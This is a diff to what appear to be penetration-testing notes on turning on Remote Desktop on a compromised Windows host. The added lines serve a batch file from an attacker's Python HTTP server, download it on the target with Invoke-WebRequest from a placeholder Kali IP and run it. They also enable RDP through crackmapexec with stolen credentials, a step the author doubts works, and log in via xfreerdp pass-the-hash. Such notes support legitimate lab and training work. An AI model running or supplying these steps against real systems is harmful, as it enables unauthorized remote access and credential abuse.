@@ -22,9 +22,29 @@ sc config TermService start= auto
 net start Termservice
 ```
 
+
+# HTTP
+
+Start hosting the file on a HTTP server
+```
+cd /usr/share/windows-resources/binaries/
+sudo python -m http.server 80
+```
+
+On the target, copy the file on PowerShell and execute it.
+```
+cd C:\Temp\
+Invoke-WebRequest -Uri 'http://<Kali_IP>/enablerdp.bat' -OutFile C:\Temp\enablerdp.bat
+cmd
+enablerdp.bat
+```
+
+
+## SMB
+
 Start hosting the file on a SMB share.
 ```
-cd <path>
+cd /usr/share/windows-resources/binaries/
 impacket-smbserver share $(pwd) -smb2support
 ```
 
@@ -36,8 +56,24 @@ C:\Temp\enablerdp.bat
 ```
 
 
+OR
+
+
+```
+crackmapexec smb <Target_IP> -u '<username>' -p '<password>' -M rdp -o ACTION=enable
+```
+- I am not sure if this really works
+
+
+
 Now, try to access it
 ```
 rdesktop <Target_IP> -d '<DOMAIN>' -u '<User>' -p '<Pwd>'
+```
+
+OR
+
+```
+xfreerdp /v:<Target_IP> /d:<DOMAIN> /u:<User> /pth:<HASH>  
 ```
 
